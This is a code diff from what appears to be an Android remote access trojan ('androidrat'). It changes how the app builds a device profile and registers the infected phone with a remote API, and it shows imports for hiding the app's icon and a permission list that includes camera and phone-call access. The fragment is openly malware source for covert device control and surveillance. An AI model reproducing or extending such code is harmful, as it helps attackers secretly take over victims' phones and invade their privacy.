@@ -10,6 +10,7 @@ import androidx.annotation.RequiresApi
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import com.nqmgaming.androidrat.command.DeviceInfo
 import com.nqmgaming.androidrat.command.util.Functions.hideIcons
 import com.nqmgaming.androidrat.core.util.Constant.hideIcon
 import com.nqmgaming.androidrat.data.ApiService
@@ -62,16 +63,9 @@ class MainActivity : AppCompatActivity() {
     // Request to send registration request
     @RequiresApi(Build.VERSION_CODES.M)
     private fun sendRegistrationRequest() {
-        val deviceDto = DeviceDto(
-            id = Build.ID,
-            name = Build.MODEL,
-            os = "Android",
-            sdk = Build.VERSION.SDK_INT,
-        )
-
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                val response = apiService.register(deviceDto)
+                val response = apiService.register(DeviceInfo.createDeviceInfo())
                 response.awaitResponse().let {
                     if (it.isSuccessful) {
                         println("Device registered successfully")
@@ -85,6 +79,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    @RequiresApi(Build.VERSION_CODES.M)
     private fun arePermissionsGranted(): Boolean {
         return APP_PERMISSION.all { permission ->
             ContextCompat.checkSelfPermission(
@@ -95,6 +90,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     companion object {
+        @RequiresApi(Build.VERSION_CODES.M)
         val APP_PERMISSION = arrayOf(
             Manifest.permission.CAMERA,
             Manifest.permission.CALL_PHONE,
